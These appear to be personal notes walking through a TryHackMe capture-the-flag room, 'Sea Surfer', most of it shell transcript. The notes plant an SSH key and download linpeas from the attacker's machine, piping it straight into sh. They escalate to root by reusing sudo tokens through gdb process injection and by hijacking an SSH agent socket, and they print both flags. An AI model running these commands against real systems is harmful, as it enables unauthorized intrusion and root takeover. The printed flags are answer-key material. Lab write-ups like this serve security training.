ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vZarFqiXyoMZ/+B9S5jcOMRIOwWMyTvWUIWwsTc2WlDBgRPRA4dnEtvHzN+WLEE0mLsatYqipe5ULuZ6EbKE1vD5lx5BO+zrEQafs5JcJ5Th0noVivP9BS3E5EuccqMOPUBKZ6YQA9Yc5jLMz2MzaRpUQSy7QojdLziXU1s0cl6TbVQbNypj4JJcmz76TxhN/gR+FXUR+YTdtb08/IJx3eOq5b0lZthBbeDXszcQKl4fwP1/MBvmmEgD2ByvdUk+kckOJsi2IEiJjm7AIFK8s2/MW2cl/t1+qDS+c/HMEQf4lum4sMEcMP7WKZ9XLHL4DPsrwCrUsK/qntuP+lvormUn9otLc0yirRpawpdBocxOpxNZKp7FL3xr47yN3A406CaLXgMYSqP2WQrumH0VsfRMp+oSxYCRC9HzFoRto7qXw3rWozLgq0RicWzdOhD59Ooc4ZA5Kro46ftMD8oCOzUDzK/lKmhnHN3Kuiz6bklOMx4qtfu28PozrFPq348= witty@kali

kyle@seasurfer:~$ ls -lah
ls -lah
total 48K
drwxr-x--- 7 kyle kyle     4.0K Apr 22  2022 .
drwxr-xr-x 3 root root     4.0K Apr 16  2022 ..
drwxrwxr-x 2 kyle kyle     4.0K Apr 19  2022 backups
lrwxrwxrwx 1 kyle kyle        9 Apr 18  2022 .bash_history -> /dev/null
-rw-r--r-- 1 kyle kyle      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 kyle kyle     3.7K Feb 25  2020 .bashrc
drwx------ 3 kyle kyle     4.0K Apr 17  2022 .cache
drwxrwxr-x 3 kyle kyle     4.0K Apr 17  2022 .local
-rw-r--r-- 1 kyle kyle      807 Feb 25  2020 .profile
-rw-rw-r-- 1 kyle www-data   66 Apr 17  2022 .selected_editor
drwx------ 3 kyle kyle     4.0K Apr 18  2022 snap
drwx------ 2 kyle kyle     4.0K Apr 17  2022 .ssh
-rw-r--r-- 1 kyle kyle        0 Apr 16  2022 .sudo_as_admin_successful
-rw-rw-r-- 1 kyle kyle       27 Apr 18  2022 user.txt
kyle@seasurfer:~$ cd .ssh
cd .ssh
kyle@seasurfer:~/.ssh$ ls
ls
authorized_keys
kyle@seasurfer:~/.ssh$ cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCtBFOcOYPyroXT89k6kqrP1gPBKZ/29utGW9QkJ9fI9ExhH/6wOtAcVkpAKn2Q3Mq96j8WO8qPOByb9o67pn2NXvoru3tOl8fsjsO1QJRchPdhNnZy59H5ssWm/uoi/RtfPbprld7QEc3VQlM+N6A8ocAUfY/6ELlnIGBNugTogKDLKP7y78mNCXODZoejuP11pWXrTawe9rm7fBSSjVFQngxS5ziMloTwyXxhNrRjK9C3Xlbqap8p+kYu7Ttqeaa5jrKg7HPvZ5E/Hn9nHnSA8Tl6wMWAAIMVKljoyFkQ494ehqORTK3UG6d3Wtz4DZacw9nH8Hs6cajEMKS7JucPIrBePBfdmLcIdzEs+vPWsMd6DZVLVNcU6FYLXwhAPSL6YyU4XIVF40E2f1waBHhdivxc0DkDCfJLObMGAbcnmeVUIj67fMrvmB0clK+3qvWqhw+L2JoOoOHqd03Q5jEZ0nwDLE1Tdr6Yn0JWjvotq57HSDkvyeUuF6AgxIHR/os= kyle@seasurfer

kyle@seasurfer:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vZarFqiXyoMZ/+B9S5jcOMRIOwWMyTvWUIWwsTc2WlDBgRPRA4dnEtvHzN+WLEE0mLsatYqipe5ULuZ6EbKE1vD5lx5BO+zrEQafs5JcJ5Th0noVivP9BS3E5EuccqMOPUBKZ6YQA9Yc5jLMz2MzaRpUQSy7QojdLziXU1s0cl6TbVQbNypj4JJcmz76TxhN/gR+FXUR+YTdtb08/IJx3eOq5b0lZthBbeDXszcQKl4fwP1/MBvmmEgD2ByvdUk+kckOJsi2IEiJjm7AIFK8s2/MW2cl/t1+qDS+c/HMEQf4lum4sMEcMP7WKZ9XLHL4DPsrwCrUsK/qntuP+lvormUn9otLc0yirRpawpdBocxOpxNZKp7FL3xr47yN3A406CaLXgMYSqP2WQrumH0VsfRMp+oSxYCRC9HzFoRto7qXw3rWozLgq0RicWzdOhD59Ooc4ZA5Kro46ftMD8oCOzUDzK/lKmhnHN3Kuiz6bklOMx4qtfu28PozrFPq348= witty@kali" >> authorized_keys 

┌──(witty㉿kali)-[~/Downloads/seasurfer]
└─$ ssh -i id_rsa kyle@10.10.74.111
The authenticity of host '10.10.74.111 (10.10.74.111)' can't be established.
ED25519 key fingerprint is SHA256:4ChmQCQ0tIG/wbF2YLD8+ZdmJVvA1bFzIRVLwXXrs0g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.74.111' (ED25519) to the list of known hosts.

  ___ ___   _     ___ _   _ ___ ___ ___ ___ 
 / __| __| /_\   / __| | | | _ \ __| __| _ \
 \__ \ _| / _ \  \__ \ |_| |   / _|| _||   /
 |___/___/_/ \_\ |___/\___/|_|_\_| |___|_|_\
                                            

Last login: Mon Jul 10 22:02:10 2023 from 127.0.0.1
kyle@seasurfer:~$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),4(adm),24(cdrom),27(sudo),30(dip),33(www-data),46(plugdev)

linpeas on the fly

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.74.111 - - [10/Jul/2023 19:39:20] "GET /linpeas.sh HTTP/1.1" 200 -

kyle@seasurfer:~$ cd /tmp
kyle@seasurfer:/tmp$ wget http://10.8.19.103:1234/linpeas.sh -O - |sh |tee -a linpeas.txt
--2023-07-10 23:39:20--  http://10.8.19.103:1234/linpeas.sh
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘STDOUT’

We all noticed that sometimes sudo doesn't ask us for a password because he remembers us. How does he remember us and how does he identifies us? Can we falsify our identity and become root?

`sudo` creates a file for each linux user in `/var/run/sudo/ts/[username]`. These files contain both successful and failed authentications, then sudo uses these files to remember all the authenticated processes.

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is disabled (0)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it


`kyle` have used sudo to execute something in the last 15mins (by default that's the duration of the sudo token that allows to use sudo without introducing any password

kyle@seasurfer:/tmp$ whoami
kyle
kyle@seasurfer:/tmp$ ps faux |grep sudo |grep ^`whoami`
kyle        1125  0.0  0.1   6892  2324 pts/0    Ss+  22:02   0:00  \_ bash -c sudo /root/admincheck; sleep infinity
kyle       96988  0.0  0.0   6300   724 pts/4    S+   23:48   0:00              \_ grep --color=auto sudo
kyle@seasurfer:/tmp$ cat /proc/sys/kernel/yama/ptrace_scope
0

`ptrace protection` as disabled

- `ptrace` is a very aptly named **Linux** system call and a debugging tool which allows to observe and _trace_ how a _process_ runs in the operating system
- However, this can be abused, since many processes contain secrets and sensitive information (such as `sudo` tokens)
- **Yama** is a **Linux Security Module** that aims to fix this by setting a scope for the processes that can be observed with `ptrace`
- If the **Yama** `ptrace_scope` is set to **0**, the protection is disabled, which allows the observation of all processes

https://github.com/nongiach/sudo_inject

We need the `gdb` program, which is a debugger for `C`, to be able to use the `ptrace` system call properly.

kyle@seasurfer:/tmp$ grep -v "^#" /etc/apt/sources.list
deb http://fi.archive.ubuntu.com/ubuntu focal main restricted

deb http://fi.archive.ubuntu.com/ubuntu focal-updates main restricted

deb http://fi.archive.ubuntu.com/ubuntu focal universe
deb http://fi.archive.ubuntu.com/ubuntu focal-updates universe

deb http://fi.archive.ubuntu.com/ubuntu focal multiverse
deb http://fi.archive.ubuntu.com/ubuntu focal-updates multiverse

deb http://fi.archive.ubuntu.com/ubuntu focal-backports main restricted universe multiverse


deb http://fi.archive.ubuntu.com/ubuntu focal-security main restricted
deb http://fi.archive.ubuntu.com/ubuntu focal-security universe
deb http://fi.archive.ubuntu.com/ubuntu focal-security multiverse

Here, we can't install `gdb` using `sudo apt install gdb`, as we don't know `kyle`'s password to run `sudo`. Therefore, we could instead download the [`.deb` package, which actually is an archive file](https://en.wikipedia.org/wiki/Deb_(file_format))

Debian packages are standard Unix ar archives that include two tar archives. One archive holds the control information and another contains the installable data.

┌──(witty㉿kali)-[~/Downloads]
└─$ wget http://fi.archive.ubuntu.com/ubuntu/pool/main/g/gdb/gdb_9.1-0ubuntu1_amd64.deb -O gdb.deb
--2023-07-10 19:52:51--  http://fi.archive.ubuntu.com/ubuntu/pool/main/g/gdb/gdb_9.1-0ubuntu1_amd64.deb
Resolving fi.archive.ubuntu.com (fi.archive.ubuntu.com)... 193.166.3.5, 2001:708:10:8::5
Connecting to fi.archive.ubuntu.com (fi.archive.ubuntu.com)|193.166.3.5|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3218448 (3.1M) [application/x-debian-package]
Saving to: ‘gdb.deb’

gdb.deb        0%       0  --.-KB/sgdb.deb        0%  21.73K   105KB/sgdb.deb        1%  50.09K   120KB/sgdb.deb        3% 106.81K   170KB/sgdb.deb        7% 220.25K   263KB/sgdb.deb       14% 447.12K   428KB/sgdb.deb       28% 895.13K   713KB/sgdb.deb       50%   1.55M  1.04MB/sgdb.deb      100%   3.07M  1.93MB/s    in 1.6s    

2023-07-10 19:52:53 (1.93 MB/s) - ‘gdb.deb’ saved [3218448/3218448]


┌──(witty㉿kali)-[~/Downloads]
└─$ ar x gdb.deb
                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ xz -d data.tar.xz && tar xvf data.tar
./
./etc/
./etc/gdb/
./etc/gdb/gdbinit
./usr/
./usr/bin/
./usr/bin/gcore
./usr/bin/gdb
./usr/bin/gdb-add-index
./usr/bin/gdbtui
./usr/share/
./usr/share/doc/
./usr/share/doc/gdb/
./usr/share/doc/gdb/NEWS.Debian.gz
./usr/share/doc/gdb/NEWS.gz
./usr/share/doc/gdb/README.Debian
./usr/share/doc/gdb/README.gz
./usr/share/doc/gdb/README.python_switch
./usr/share/doc/gdb/changelog.Debian.gz
./usr/share/doc/gdb/check.log.gz
./usr/share/doc/gdb/contrib/
./usr/share/doc/gdb/contrib/ari/
./usr/share/doc/gdb/contrib/ari/create-web-ari-in-src.sh
./usr/share/doc/gdb/contrib/ari/gdb_ari.sh.gz
./usr/share/doc/gdb/contrib/ari/gdb_find.sh
./usr/share/doc/gdb/contrib/ari/update-web-ari.sh.gz
./usr/share/doc/gdb/contrib/cc-with-tweaks.sh.gz
./usr/share/doc/gdb/contrib/expect-read1.c
./usr/share/doc/gdb/contrib/expect-read1.sh
./usr/share/doc/gdb/contrib/gdb-add-index.sh
./usr/share/doc/gdb/contrib/test_pubnames_and_indexes.py.gz
./usr/share/doc/gdb/contrib/words.sh
./usr/share/doc/gdb/copyright
./usr/share/doc/gdb/refcard.dvi.gz
./usr/share/doc/gdb/refcard.ps.gz
./usr/share/doc/gdb/refcard.tex.gz
./usr/share/gdb/
./usr/share/gdb/python/
./usr/share/gdb/python/gdb/
./usr/share/gdb/python/gdb/FrameDecorator.py
./usr/share/gdb/python/gdb/FrameIterator.py
./usr/share/gdb/python/gdb/__init__.py
./usr/share/gdb/python/gdb/command/
./usr/share/gdb/python/gdb/command/__init__.py
./usr/share/gdb/python/gdb/command/explore.py
./usr/share/gdb/python/gdb/command/frame_filters.py
./usr/share/gdb/python/gdb/command/pretty_printers.py
./usr/share/gdb/python/gdb/command/prompt.py
./usr/share/gdb/python/gdb/command/type_printers.py
./usr/share/gdb/python/gdb/command/unwinders.py
./usr/share/gdb/python/gdb/command/xmethods.py
./usr/share/gdb/python/gdb/frames.py
./usr/share/gdb/python/gdb/function/
./usr/share/gdb/python/gdb/function/__init__.py
./usr/share/gdb/python/gdb/function/as_string.py
./usr/share/gdb/python/gdb/function/caller_is.py
./usr/share/gdb/python/gdb/function/strfns.py
./usr/share/gdb/python/gdb/printer/
./usr/share/gdb/python/gdb/printer/__init__.py
./usr/share/gdb/python/gdb/printer/bound_registers.py
./usr/share/gdb/python/gdb/printing.py
./usr/share/gdb/python/gdb/prompt.py
./usr/share/gdb/python/gdb/types.py
./usr/share/gdb/python/gdb/unwinder.py
./usr/share/gdb/python/gdb/xmethod.py
./usr/share/gdb/syscalls/
./usr/share/gdb/syscalls/aarch64-linux.xml
./usr/share/gdb/syscalls/amd64-linux.xml
./usr/share/gdb/syscalls/arm-linux.xml
./usr/share/gdb/syscalls/freebsd.xml
./usr/share/gdb/syscalls/gdb-syscalls.dtd
./usr/share/gdb/syscalls/i386-linux.xml
./usr/share/gdb/syscalls/mips-n32-linux.xml
./usr/share/gdb/syscalls/mips-n64-linux.xml
./usr/share/gdb/syscalls/mips-o32-linux.xml
./usr/share/gdb/syscalls/ppc-linux.xml
./usr/share/gdb/syscalls/ppc64-linux.xml
./usr/share/gdb/syscalls/s390-linux.xml
./usr/share/gdb/syscalls/s390x-linux.xml
./usr/share/gdb/syscalls/sparc-linux.xml
./usr/share/gdb/syscalls/sparc64-linux.xml
./usr/share/gdb/system-gdbinit/
./usr/share/gdb/system-gdbinit/elinos.py
./usr/share/gdb/system-gdbinit/wrs-linux.py
./usr/share/man/
./usr/share/man/man1/
./usr/share/man/man1/gcore.1.gz
./usr/share/man/man1/gdb.1.gz
./usr/share/menu/
./usr/share/menu/gdb

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server -d usr/bin/ 1234 
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.74.111 - - [10/Jul/2023 19:59:54] "GET /gdb HTTP/1.1" 200 -

This option specifies the directory from which the server will serve files. In this case, it's set to `usr/bin/`

kyle@seasurfer:/tmp$ wget http://10.8.19.103:1234/gdb
--2023-07-10 23:59:53--  http://10.8.19.103:1234/gdb
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8440200 (8.0M) [application/octet-stream]
Saving to: ‘gdb’

gdb                              100%[=======================================================>]   8.05M  1.13MB/s    in 7.9s    

2023-07-11 00:00:03 (1.02 MB/s) - ‘gdb’ saved [8440200/8440200]

┌──(witty㉿kali)-[~/Downloads]
└─$ wget https://github.com/nongiach/sudo_inject/archive/refs/heads/master.zip

or just

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/nongiach/sudo_inject.git
Cloning into 'sudo_inject'...
remote: Enumerating objects: 253, done.
remote: Total 253 (delta 0), reused 0 (delta 0), pack-reused 253
Receiving objects: 100% (253/253), 5.99 MiB | 7.42 MiB/s, done.
Resolving deltas: 100% (132/132), done.
                                                                                    
┌──(witty㉿kali)-[~/Downloads]
└─$ cd sudo_inject 
                                                                                    
┌──(witty㉿kali)-[~/Downloads/sudo_inject]
└─$ ls
activate_sudo_token  exploit_v2.sh  extra_tools  slides_breizh_2019.pdf
exploit.sh           exploit_v3.sh  README.md

┌──(witty㉿kali)-[~/Downloads/sudo_inject]
└─$ python3 -m http.server 1234            
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.175.140 - - [10/Jul/2023 20:19:13] "GET /exploit.sh HTTP/1.1" 200 -

kyle@seasurfer:/tmp$ wget http://10.8.19.103:1234/exploit.sh
--2023-07-11 00:19:12--  http://10.8.19.103:1234/exploit.sh
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 648 [text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh                100%[====================================>]     648  --.-KB/s    in 0s      

2023-07-11 00:19:13 (71.4 MB/s) - ‘exploit.sh’ saved [648/648]

kyle@seasurfer:/tmp$ ls
empty       ssh-MLukItSUvl
empty2      ssh-RHwxIKi56zVJ
empty3      systemd-private-da298949e7224408b0aa7463ed43ecf5-apache2.service-eAalKf
exploit.sh  systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-logind.service-p8FrWh
f           systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-resolved.service-Y3ELhf
gdb         systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-timesyncd.service-Qx305e
snap.lxd

kyle@seasurfer:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

kyle@seasurfer:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;
kyle@seasurfer:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp

kyle@seasurfer:/tmp$ sh exploit.sh
Current process : 9094
cp: 'activate_sudo_token' and '/tmp/activate_sudo_token' are the same file
Injecting process 1128 -> bash
Injecting process 1936 -> bash
Injecting process 9068 -> sh
Injecting process 9071 -> sh
cat: /proc/9097/comm: No such file or directory
Injecting process 9097 -> 
cat: /proc/9099/comm: No such file or directory
Injecting process 9099 -> 
cat: /proc/9103/comm: No such file or directory
Injecting process 9103 -> 
cat: /proc/9106/comm: No such file or directory
Injecting process 9106 -> 
kyle@seasurfer:/tmp$ sudo su

it works just

kyle@seasurfer:/tmp$ chmod +x gdb
kyle@seasurfer:/tmp$ ls
activate_sudo_token  snap.lxd
empty                ssh-MLukItSUvl
empty2               ssh-RHwxIKi56zVJ
empty3               systemd-private-da298949e7224408b0aa7463ed43ecf5-apache2.service-eAalKf
exploit.sh           systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-logind.service-p8FrWh
exploit_v2.sh        systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-resolved.service-Y3ELhf
f                    systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-timesyncd.service-Qx305e
gdb
kyle@seasurfer:/tmp$ ./gdb
Python Exception <class 'ModuleNotFoundError'> No module named 'gdb': 
./gdb: warning: 
Could not load the Python gdb module from `/usr/share/gdb/python'.
Limited Python support is available from the _gdb module.
Suggest passing --data-directory=/path/to/gdb/data-directory.
GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
--Type <RET> for more, q to quit, c to continue without paging--
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
(gdb) quit

kyle@seasurfer:/tmp$ sudo su
root@seasurfer:/tmp# cd /root
root@seasurfer:~# ls
admincheck  credits.txt  hidePID.sh  root.txt  snap  SSHtoserver.sh
root@seasurfer:~# cat root.txt 
THM{STEALING_SUDO_TOKENS}
root@seasurfer:~# cat credits.txt 
Good job completing the box!

DM me on Discord if you found any unintended paths / improvement suggestions: lassi#2701

Credits:

Room and company icon: My lovely girlfriend <3

Wordpress images:
https://www.pexels.com/photo/assorted-colors-of-surfboard-757133/
https://unsplash.com/photos/I3AMPLzJjW8
https://commons.wikimedia.org/wiki/File:Venice_Sunset_by_Gustavo_Gerdel.jpg

Employee pictures:
https://thispersondoesnotexist.com

PDF generator background image:
https://pixabay.com/photos/beach-birds-sea-ocean-flying-birds-1852945/

HTML invoice template:
https://github.com/sparksuite/simple-html-invoice-template

root@seasurfer:~# cat SSHtoserver.sh 
#!/bin/bash

eval $(/usr/bin/ssh-agent -s)
/usr/bin/ssh-add /root/.ssh/id_rsa

export SSH_AUTH_SOCK="$(find /tmp/ -type s -path '/tmp/ssh-*/agent.*' -user $(whoami) 2>/dev/null)"

/usr/bin/ssh -A -i /root/.ssh/id_rsa kyle@seasurfer.thm -tt 'sudo /root/admincheck; sleep infinity'


root@seasurfer:~# cat hidePID.sh
#!/bin/bash

mkdir /tmp/empty
mkdir /tmp/empty2
mkdir /tmp/empty3

PID1=$(/usr/bin/pgrep -f "/bin/bash /root/SSHtoserver.sh")
PID2=$(/usr/bin/pgrep -f "/usr/bin/ssh -A -i /root/.ssh/id_rsa kyle@seasurfer.thm -tt sudo /root/admincheck")
PID3=$(/usr/bin/pgrep -f "sshd: kyle \[priv\]")

mount -o bind /tmp/empty /proc/$PID1
mount -o bind /tmp/empty2 /proc/$PID2
mount -o bind /tmp/empty3 /proc/$PID3

root@seasurfer:/tmp# ls 
activate_sudo_token  sh
empty                snap.lxd
empty2               ssh-MLukItSUvl
empty3               ssh-RHwxIKi56zVJ
exploit.sh           systemd-private-da298949e7224408b0aa7463ed43ecf5-apache2.service-eAalKf
exploit_v2.sh        systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-logind.service-p8FrWh
f                    systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-resolved.service-Y3ELhf
gdb                  systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-timesyncd.service-Qx305e


do it manually


┌──(witty㉿kali)-[~/Downloads/sudo_inject]
└─$ tac exploit.sh 
done
                | gdb -q -n -p "$pid" >/dev/null 2>&1

kyle@seasurfer:/tmp$ whoami
kyle
kyle@seasurfer:/tmp$ ps faux |grep sudo |grep ^`whoami`
kyle        1128  0.0  0.1   6892  3304 pts/0    Ss+  00:05   0:00  \_ bash -c sudo /root/admincheck; sleep infinity
kyle       12846  0.0  0.0   6300   720 pts/2    S+   00:36   0:00                  \_ grep --color=auto sudo
kyle@seasurfer:/tmp$ gdb -q -n -p 1128
Python Exception <class 'ModuleNotFoundError'> No module named 'gdb': 
gdb: warning: 
Could not load the Python gdb module from `/usr/share/gdb/python'.
Limited Python support is available from the _gdb module.
Suggest passing --data-directory=/path/to/gdb/data-directory.
Attaching to process 1128
Reading symbols from /usr/bin/bash...
(No debugging symbols found in /usr/bin/bash)
Reading symbols from /lib/x86_64-linux-gnu/libtinfo.so.6...
(No debugging symbols found in /lib/x86_64-linux-gnu/libtinfo.so.6)
Reading symbols from /lib/x86_64-linux-gnu/libdl.so.2...
Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libdl-2.31.so...
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...
Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.31.so...
Reading symbols from /lib64/ld-linux-x86-64.so.2...
--Type <RET> for more, q to quit, c to continue without paging--
(No debugging symbols found in /lib64/ld-linux-x86-64.so.2)
Python Exception <class 'NameError'> Installation error: gdb._execute_unwinders function is missing: 
0x00007f0f84f34c6a in __GI___wait4 (Python Exception <class 'NameError'> Installation error: gdb._execute_unwinders function is missing: 
pid=-1, stat_loc=0x7ffc25876e10, options=0, usage=0x0)
    at ../sysdeps/unix/sysv/linux/wait4.c:27
27	../sysdeps/unix/sysv/linux/wait4.c: No such file or directory.
(gdb) call system("echo | sudo -S chmod +s /bin/bash 2>&1")
Python Exception <class 'NameError'> Installation error: gdb._execute_unwinders function is missing: 
[Detaching after vfork from child process 13301]
Python Exception <class 'NameError'> Installation error: gdb._execute_unwinders function is missing: 
$1 = 0
(gdb) quit
A debugging session is active.

	Inferior 1 [process 1128] will be detached.

Quit anyway? (y or n) y
Detaching from program: /usr/bin/bash, process 1128
[Inferior 1 (process 1128) detached]
kyle@seasurfer:/tmp$ ls -lpah /bin/bash
-rwsr-sr-x 1 root root 1.2M Jun 18  2020 /bin/bash
kyle@seasurfer:/tmp$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# :)

another way after rooting

export SSH_AUTH_SOCK="$(find /tmp/ -type s -path '/tmp/ssh-*/agent.*' -user $(whoami) 2>/dev/null)"

PAM stands for Pluggable Authentication Modules. In the context of `sudo`, PAM is used to provide a flexible authentication mechanism for controlling access to privileged commands. PAM allows system administrators to configure various authentication methods and policies that are used when users attempt to execute commands with `sudo`.

When a user tries to run a command with `sudo`, the PAM module for `sudo` is invoked. This module checks the user's credentials and verifies whether they are allowed to execute the requested command. PAM supports a wide range of authentication methods, such as passwords, smart cards, biometrics, and more. It provides a modular and configurable framework that allows administrators to define their desired authentication policies.

PAM provides an additional layer of security by enforcing authentication requirements for elevated privileges, helping to ensure that only authorized users can perform privileged actions on a system.

kyle@seasurfer:/tmp$ cat /etc/pam.d/sudo
#%PAM-1.0

auth sufficient pam_ssh_agent_auth.so file=/etc/ssh/sudo_authorized_keys

session    required   pam_env.so readenv=1 user_readenv=0
session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0
@include common-auth
@include common-account
@include common-session-noninteractive

we found an `SSH` agent socket file for the shell process we can access

kyle@seasurfer:/tmp$ cd ssh-MLukItSUvl
kyle@seasurfer:/tmp/ssh-MLukItSUvl$ ls
agent.1127
kyle@seasurfer:/tmp/ssh-MLukItSUvl$ cd ..
kyle@seasurfer:/tmp$ cd ssh-RHwxIKi56zVJ
bash: cd: ssh-RHwxIKi56zVJ: Permission denied

we have to do is add the `SSH_AUTH_SOCK` and location to our environment variable and **PAM** would let us use `sudo`


kyle@seasurfer:/tmp$ export SSH_AUTH_SOCK=/tmp/ssh-MLukItSUvl/agent.1127
kyle@seasurfer:/tmp$ ssh-add -l
3072 SHA256:boZASmxRncp8AM+gt1toNuZr9jh1dyatwf9DPZYit88 kyle@seasurfer (RSA)


The command `ssh-add -l` is used to list the identities added to the SSH agent.

When you use SSH to connect to remote servers or systems, you typically authenticate using an SSH key pair. The private key is stored on your local machine, and the corresponding public key is uploaded to the remote server. The SSH agent is a program that runs on your local machine and manages your SSH keys.

By running `ssh-add -l`, you can view the list of identities (private keys) that have been added to the SSH agent. This command displays the fingerprint or identifier for each key. The fingerprint is a unique cryptographic representation of the key that helps identify it.

Listing the identities with `ssh-add -l` is useful for verifying which keys are currently available in the SSH agent and can be used for authentication when connecting to remote servers.

kyle@seasurfer:/tmp$ sudo -s
root@seasurfer:/tmp# :)


```
![[Pasted image 20230710174237.png]]

What is user.txt?

*THM{SSRFING_TO_LFI_TO_RCE}*

What is root.txt?

*THM{STEALING_SUDO_TOKENS}*


[[Anonymous Playground]]